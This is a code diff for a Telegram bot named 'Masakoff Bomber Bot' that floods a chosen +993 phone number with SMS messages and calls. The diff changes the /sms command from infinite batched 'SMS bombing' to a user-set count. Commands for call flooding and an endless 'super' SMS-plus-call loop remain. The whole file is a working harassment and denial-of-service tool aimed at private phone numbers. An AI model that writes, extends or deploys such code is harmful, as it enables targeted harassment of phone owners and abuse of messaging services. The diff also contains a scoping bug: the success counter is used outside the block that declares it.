@@ -178,66 +178,58 @@ async function runSuper(chatId: string, phoneNumber: string) {
   }
 }
 
-// --- 💣 SMS sending job (INFINITE with batch of 3 + 45s cooldown) ---
-async function runSMS(chatId: string, phoneNumber: string) {
+// --- 💣 SMS sending job (original) ---
+async function runSMS(chatId: string, phoneNumber: string, targetCount: number) {
   const key = ["task", chatId];
-  await kv.set(key, { type: "sms", phoneNumber, stop: false, batch: 0, attempt: 0 });
+  await kv.set(key, { type: "sms", phoneNumber, stop: false, count: 0, target: targetCount });
 
-  await sendMessage(chatId, `📱 Starting INFINITE SMS bombing to +993${phoneNumber} 🔥\n🔁 3 SMS → Wait 45s → Repeat forever...`);
+  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥\nTarget Count: ${targetCount}`);
 
   try {
-    let batch = 0;
-    while (true) {
+    let currentSuccessCount = 0;
+    while (currentSuccessCount < targetCount) {
       const task = await kv.get(key);
       if (!task.value || task.value.stop) break;
 
-      batch++;
-      await kv.set(key, { ...task.value, batch });
-
-      await sendMessage(chatId, `📤 Starting batch ${batch} — sending up to 3 SMS to +993${phoneNumber}...`);
-
-      // --- Send 3 SMS with 5s gap ---
-      for (let i = 1; i <= 3; i++) {
+      for (let i = 0; i < 3 && currentSuccessCount < targetCount; i++) {
         const check = await kv.get(key);
         if (!check.value || check.value.stop) break;
 
-        const currentAttempt = (check.value.attempt || 0) + 1;
-        await kv.set(key, { ...check.value, attempt: currentAttempt });
+        const newCount = (check.value.count ?? 0) + 1;
+        await kv.set(key, { ...check.value, count: newCount });
 
-        await sendMessage(chatId, `📤 Batch ${batch}, SMS #${i}/3: Sending to +993${phoneNumber}...`);
+        await sendMessage(chatId, `📤 Attempting SMS #${newCount}/${targetCount} to +993${phoneNumber}...`);
+
         const ok = await sendSingleSMS(phoneNumber);
-
         if (ok) {
-          await sendMessage(chatId, `✅ SMS #${i} of batch ${batch} sent successfully!`);
+          currentSuccessCount++;
+          await sendMessage(chatId, `✅ Sent successfully! (${currentSuccessCount}/${targetCount})`);
+          await kv.set(key, { ...check.value, count: newCount, successCount: currentSuccessCount });
         } else {
-          await sendMessage(chatId, `⚠️ SMS #${i} of batch ${batch} failed. Continuing...`);
+          await sendMessage(chatId, "❌ SMS failed.");
         }
 
-        const afterSend = await kv.get(key);
-        if (!afterSend.value || afterSend.value.stop) break;
+        const checkAfter = await kv.get(key);
+        if (!checkAfter.value || checkAfter.value.stop) break;
 
-        // Wait 5 seconds between SMS (except after the 3rd)
-        if (i < 3) {
-          const waitOk = await sleepInterruptible(5000, chatId);
-          if (!waitOk) break;
-        }
+        const sleepOk = await sleepInterruptible(5000, chatId);
+        if (!sleepOk) break;
       }
 
-      const afterBatch = await kv.get(key);
-      if (!afterBatch.value || afterBatch.value.stop) break;
+      const batchCheck = await kv.get(key);
+      if (!batchCheck.value || batchCheck.value.stop) break;
 
-      // --- Wait 45 seconds after every batch of 3 ---
-      await sendMessage(chatId, `⏳ Batch ${batch} complete. Waiting 45 seconds before next batch...`);
-      const waitOk = await sleepInterruptible(45000, chatId);
-      if (!waitOk) break;
+      if (currentSuccessCount < targetCount) {
+        await sendMessage(chatId, `⏳ Batch of 3 attempts done. Waiting 45 seconds before next batch... (${currentSuccessCount}/${targetCount} sent successfully)`);
+        const waitOk = await sleepInterruptible(45000, chatId);
+        if (!waitOk) break;
+      }
     }
   } catch (e) {
     console.error("SMS task error ❌", e);
   } finally {
-    const finalState = await kv.get(key);
-    const totalAttempts = finalState.value?.attempt || 0;
     await kv.delete(key);
-    await sendMessage(chatId, `⏹ SMS bombing stopped for +993${phoneNumber}. Total attempts: ${totalAttempts} 🎉`);
+    await sendMessage(chatId, `⏹ SMS sending stopped or finished. Total successful: ${currentSuccessCount}/${targetCount} 🎉`);
   }
 }
 
@@ -296,7 +288,7 @@ serve(async (req) => {
     await sendMessage(chatId,
       "👋 Welcome to 💥 Masakoff Bomber Bot 💥\n\n" +
       "📲 Commands:\n" +
-      "• /sms <number> — start INFINITE SMS bombing (3 SMS → 45s wait)\n" +
+      "• /sms <number> <count> — start sending SMS\n" +
       "• /call <number> — start sending calls\n" +
       "• /super <number> — SMS + Call loop forever\n" +
       "• /stop — stop all sending ⛔\n\n" +
@@ -304,14 +296,17 @@ serve(async (req) => {
     );
   } else if (text.startsWith("/sms")) {
     const parts = text.split(" ");
-    if (parts.length < 2) {
-      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /sms 61234567");
+    if (parts.length < 3) {
+      await sendMessage(chatId, "⚠️ Please provide phone number and count. Example: /sms 61234567 10");
       return new Response("OK");
     }
 
-    let phoneNumber = parts[1].trim().replace(/^\+?(993)?/, "");
-    if (!/^\d+$/.test(phoneNumber)) {
-      await sendMessage(chatId, "⚠️ Please provide a valid phone number (digits only).");
+    const phoneNumber = parts[1].replace(/^\+993/, "");
+    const countStr = parts[2];
+    const targetCount = parseInt(countStr, 10);
+
+    if (isNaN(targetCount) || targetCount <= 0) {
+      await sendMessage(chatId, "⚠️ Please provide a valid positive number for count.");
       return new Response("OK");
     }
 
@@ -321,8 +316,8 @@ serve(async (req) => {
       return new Response("OK");
     }
 
-    runSMS(chatId, phoneNumber).catch(console.error);
-    await sendMessage(chatId, `🚀 INFINITE SMS bombing started for +993${phoneNumber}`);
+    runSMS(chatId, phoneNumber, targetCount).catch(console.error);
+    await sendMessage(chatId, `🚀 SMS sending started for +993${phoneNumber}\nTarget Count: ${targetCount}`);
   } else if (text.startsWith("/call")) {
     const parts = text.split(" ");
     if (parts.length < 2) {
@@ -371,10 +366,10 @@ serve(async (req) => {
       await sendMessage(chatId, "ℹ️ No active task to stop.");
     } else {
       await kv.set(["task", chatId], { ...task.value, stop: true });
-      await sendMessage(chatId, `🛑 Stop signal sent! ${task.value.type === 'call' ? 'Calls' : task.value.type === 'sms' ? 'SMS bombing' : 'SUPER mode'} will halt instantly.`);
+      await sendMessage(chatId, `🛑 Stop signal sent! ${task.value.type === 'call' ? 'Calls' : task.value.type === 'sms' ? 'SMS' : 'SUPER mode'} will halt instantly.`);
     }
   } else {
-    await sendMessage(chatId, "❓ Unknown command. Try /start, /sms <number>, /call <number>, /super <number>, or /stop.");
+    await sendMessage(chatId, "❓ Unknown command. Try /start, /sms <number> <count>, /call <number>, /super <number>, or /stop.");
   }
 
   return new Response("OK");
@@ -387,7 +382,8 @@ serve(async (req) => {
     if (entry.value && !entry.value.stop) {
       console.log(`Resuming ${entry.value.type} task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
       if (entry.value.type === "sms") {
-        runSMS(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
+        const targetCount = entry.value.target || 0;
+        runSMS(entry.key[1] as string, entry.value.phoneNumber, targetCount).catch(console.error);
       } else if (entry.value.type === "call") {
         runCall(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
       } else if (entry.value.type === "super") {
